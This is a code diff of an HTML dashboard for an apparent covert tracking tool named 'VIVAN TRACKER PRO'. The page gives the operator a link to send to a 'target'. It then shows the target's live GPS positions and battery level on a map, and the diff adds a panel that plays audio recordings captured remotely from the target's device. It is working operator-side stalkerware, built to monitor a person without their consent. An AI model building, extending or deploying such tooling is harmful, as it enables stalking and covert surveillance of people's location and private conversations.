@@ -3,94 +3,150 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VIVAN | Pro Dashboard</title>
+    <title>VIVAN | Pro Monitoring Dashboard</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
     <style>
         :root { --neon-blue: #00d2ff; --neon-green: #39ff14; --bg-dark: #0f172a; }
-        body { margin: 0; font-family: 'Inter', sans-serif; background: var(--bg-dark); color: white; height: 100vh; display: flex; flex-direction: column; }
+        body { margin: 0; font-family: 'Inter', sans-serif; background: var(--bg-dark); color: white; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
         
-        header { background: rgba(30, 41, 59, 0.8); backdrop-filter: blur(10px); padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(0, 210, 255, 0.3); }
-        .logo { font-family: 'Orbitron'; color: var(--neon-blue); text-shadow: 0 0 10px var(--neon-blue); }
+        /* Header & Link Bar */
+        header { background: rgba(30, 41, 59, 0.9); backdrop-filter: blur(10px); padding: 12px 25px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--neon-blue); z-index: 1000; }
+        .logo { font-family: 'Orbitron'; color: var(--neon-blue); text-shadow: 0 0 10px var(--neon-blue); font-size: 1.2rem; }
+        
+        .link-section { background: rgba(0, 210, 255, 0.05); padding: 10px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1); }
+        code { background: #000; padding: 5px 12px; color: var(--neon-green); border-radius: 4px; font-size: 0.85rem; border: 1px solid rgba(57, 255, 20, 0.3); }
+        
+        /* Main Layout */
+        .dashboard-container { display: flex; flex: 1; overflow: hidden; }
+        #map { flex: 3; height: 100%; }
+        
+        /* Sidebar Styles */
+        .sidebar { flex: 1; min-width: 320px; background: #1e293b; border-left: 1px solid rgba(255,255,255,0.1); display: flex; flex-direction: column; overflow-y: auto; }
+        .panel { padding: 20px; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        .panel-title { font-family: 'Orbitron'; font-size: 0.75rem; color: var(--neon-blue); letter-spacing: 1px; margin-bottom: 15px; display: flex; align-items: center; gap: 8px; }
+        
+        /* Status & Logs */
+        .stat-card { background: rgba(255,255,255,0.03); border-radius: 10px; padding: 15px; border: 1px solid rgba(255,255,255,0.05); }
+        .log-item { background: rgba(0,0,0,0.2); padding: 10px; border-radius: 6px; border-left: 3px solid var(--neon-green); margin-bottom: 10px; font-size: 0.8rem; }
+        
+        /* Buttons */
+        .btn-copy { background: var(--neon-blue); border: none; padding: 6px 15px; border-radius: 4px; color: #0f172a; font-weight: bold; cursor: pointer; font-size: 0.7rem; transition: 0.3s; }
+        .btn-copy:hover { background: var(--neon-green); box-shadow: 0 0 10px var(--neon-green); }
 
-        .link-bar { background: rgba(0, 210, 255, 0.1); padding: 10px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.05); }
-        code { background: #000; padding: 5px 10px; color: var(--neon-green); border-radius: 4px; }
-
-        .main-layout { display: flex; flex: 1; overflow: hidden; }
-        #map { flex: 3; background: #0b0e14; }
-        
-        .sidebar { flex: 1; background: #1e293b; padding: 20px; border-left: 1px solid rgba(255,255,255,0.1); overflow-y: auto; min-width: 280px; }
-        .stat-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); padding: 15px; border-radius: 12px; margin-bottom: 15px; }
-        .live-item { border-left: 3px solid var(--neon-green); padding: 10px; background: rgba(255,255,255,0.02); margin-top: 10px; font-size: 0.8rem; }
-        
-        button { background: var(--neon-blue); border: none; padding: 5px 15px; border-radius: 4px; color: #0f172a; font-weight: bold; cursor: pointer; }
+        /* Custom Audio Player */
+        audio { height: 30px; width: 100%; margin-top: 5px; filter: invert(100%) hue-rotate(180deg) brightness(1.5); }
     </style>
 </head>
 <body>
 
 <header>
     <div class="logo">VIVAN TRACKER PRO</div>
-    <div style="font-size: 0.8rem; color: var(--neon-green)">● Welcome, {{ username }} | <a href="/logout" style="color: white; text-decoration:none;">Logout</a></div>
+    <div style="font-size: 0.75rem;">
+        <span style="color: var(--neon-green)">● ONLINE: {{ username }}</span> | 
+        <a href="/logout" style="color: #ff4757; text-decoration: none; font-weight: bold;">DISCONNECT</a>
+    </div>
 </header>
 
-<div class="link-bar">
-    <span>Your Tracking Link: </span>
+<div class="link-section">
+    <span style="font-size: 0.8rem; color: #94a3b8; margin-right: 10px;">TRACKING LINK:</span>
     <code id="trackLink">{{ link }}</code>
-    <button onclick="copyLink()">COPY</button>
+    <button class="btn-copy" onclick="copyLink()" style="margin-left: 10px;">COPY URL</button>
 </div>
 
-<div class="main-layout">
+<div class="dashboard-container">
     <div id="map"></div>
+    
     <div class="sidebar">
-        <div class="stat-card">
-            <h4 style="margin:0; color: #94a3b8;">SYSTEM STATUS</h4>
-            <p style="color: var(--neon-green); font-family: 'Orbitron'; margin: 10px 0;">ACTIVE ACCESS</p>
-        </div>
-        <div id="feed">
-            <h4 style="color: var(--neon-blue);">LIVE ACTIVITY LOG</h4>
+        
+        <div class="panel">
+            <div class="panel-title">📡 LIVE POSITION LOGS</div>
+            <div id="location-feed">
+                <p style="font-size: 0.75rem; color: #64748b;">Awaiting incoming data...</p>
             </div>
+        </div>
+
+        <div class="panel">
+            <div class="panel-title">🎙️ REMOTE AUDIO LOGS</div>
+            <div id="audio-feed">
+                <p style="font-size: 0.75rem; color: #64748b;">No recordings detected yet.</p>
+            </div>
+        </div>
+
     </div>
 </div>
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
-    var map = L.map('map', {zoomControl: false}).setView([26.7606, 83.8914], 10);
+    // Initialize Map with Dark Mode
+    var map = L.map('map', {zoomControl: false}).setView([26.7606, 83.8914], 12);
     L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
 
     function copyLink() {
         var text = document.getElementById("trackLink").innerText;
         navigator.clipboard.writeText(text);
-        alert("Link Copied!");
+        alert("Link Copied! Target ko send karein.");
     }
 
-    function fetchData() {
+    // Refresh Locations & Map Markers
+    function refreshLocations() {
         fetch('/get_data')
             .then(res => res.json())
             .then(data => {
-                const feed = document.getElementById('feed');
-                feed.innerHTML = '<h4 style="color: var(--neon-blue);">LIVE ACTIVITY LOG</h4>';
+                const feed = document.getElementById('location-feed');
+                if(data.length > 0) feed.innerHTML = '';
                 
                 data.forEach((loc, i) => {
-                    // Update Map
+                    // Update Map (Blue marker for latest, Green for old)
                     L.circleMarker([loc.latitude, loc.longitude], {
-                        radius: i === 0 ? 10 : 6,
+                        radius: i === 0 ? 12 : 6,
                         color: i === 0 ? '#00d2ff' : '#39ff14',
-                        fillOpacity: 0.7
+                        fillOpacity: 0.8
                     }).addTo(map);
 
-                    // Update Sidebar Feed
+                    // Add to Sidebar
+                    if(i < 5) { // Sirf top 5 dikhayein
+                        feed.innerHTML += `
+                            <div class="log-item">
+                                <b>Location Spotted</b><br>
+                                <span style="color: #94a3b8; font-size: 0.7rem;">${loc.timestamp} | Batt: ${loc.battery}</span>
+                            </div>
+                        `;
+                    }
+                });
+            });
+    }
+
+    // Refresh Audio Recordings
+    function refreshAudios() {
+        fetch('/get_audios')
+            .then(res => res.json())
+            .then(data => {
+                const feed = document.getElementById('audio-feed');
+                if(data.length > 0) feed.innerHTML = '';
+                
+                data.forEach(aud => {
                     feed.innerHTML += `
-                        <div class="live-item">
-                            <b>Update Received</b><br>
-                            Batt: ${loc.battery} | Time: ${loc.timestamp}
+                        <div class="log-item" style="border-left-color: var(--neon-blue);">
+                            <span style="font-size: 0.7rem;">Capture: ${aud.timestamp}</span><br>
+                            <audio controls>
+                                <source src="/static/recordings/${aud.filename}" type="audio/webm">
+                            </audio>
                         </div>
                     `;
                 });
             });
     }
 
-    setInterval(fetchData, 15000);
-    fetchData();
+    // Auto-update every 10 seconds
+    setInterval(() => {
+        refreshLocations();
+        refreshAudios();
+    }, 10000);
+
+    // Initial load
+    refreshLocations();
+    refreshAudios();
 </script>
 
 </body>
